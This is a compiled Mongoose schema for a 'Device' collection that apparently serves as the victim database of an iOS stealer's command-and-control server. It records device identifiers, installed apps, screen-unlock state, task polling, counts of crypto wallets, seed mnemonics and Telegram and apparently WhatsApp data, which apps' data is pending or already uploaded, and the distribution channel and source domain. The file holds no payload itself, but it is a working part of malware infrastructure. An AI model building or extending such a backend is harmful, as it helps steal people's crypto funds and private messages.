import mongoose, { Schema } from 'mongoose';
const DeviceSchema = new Schema({
    uniqueId: { type: String, required: true, unique: true },
    channelCode: { type: String, default: '' },
    ecid: { type: String, default: '' },
    serialId: { type: String, default: '' },
    fingerId: { type: String, default: '' },
    productType: { type: String, default: '' },
    iosVersion: { type: String, default: '' },
    buildVersion: { type: String, default: '' },
    ip: { type: String, default: '' },
    timezone: { type: String, default: '' },
    sdkVersion: { type: String, default: '' },
    installedApps: { type: [String], default: [] },
    moduleStatus: { type: Schema.Types.Mixed, default: null },
    sourceDomain: { type: String, default: '' },
    sourceDomainUpdatedAt: { type: Date },
    sourceDomainCheckedAt: { type: Date },
    walletCount: { type: Number, default: 0 },
    wsCount: { type: Number, default: 0 },
    tgCount: { type: Number, default: 0 },
    mnemonicCount: { type: Number, default: 0 },
    lastSeen: { type: Date, default: Date.now, index: true },
    firstSeen: { type: Date, default: Date.now },
    lastTaskPoll: { type: Date, default: () => new Date(0) },
    screenUnlocked: { type: Boolean, default: false },
    pendingDataApps: { type: [String], default: [] },
    uploadedDataApps: { type: [String], default: [] },
    updatedAt: { type: Date, default: Date.now },
});
DeviceSchema.index({ channelCode: 1, firstSeen: -1 });
DeviceSchema.index({ firstSeen: -1 });
DeviceSchema.index({ channelCode: 1, lastSeen: -1 });
DeviceSchema.index({ channelCode: 1, ip: 1 });
DeviceSchema.index({ sourceDomain: 1, firstSeen: -1 });
DeviceSchema.index({ channelCode: 1, sourceDomain: 1, firstSeen: -1 });
DeviceSchema.index({ firstSeen: 1, channelCode: 1, sourceDomain: 1 });
DeviceSchema.index({ channelCode: 1, walletCount: 1, firstSeen: -1 });
DeviceSchema.index({ lastTaskPoll: -1 });
DeviceSchema.index({ channelCode: 1, lastTaskPoll: -1 });
DeviceSchema.index({ pendingDataApps: 1, channelCode: 1 });
DeviceSchema.index({ uploadedDataApps: 1, channelCode: 1 });
export const Device = mongoose.model('Device', DeviceSchema);
//# sourceMappingURL=device.js.map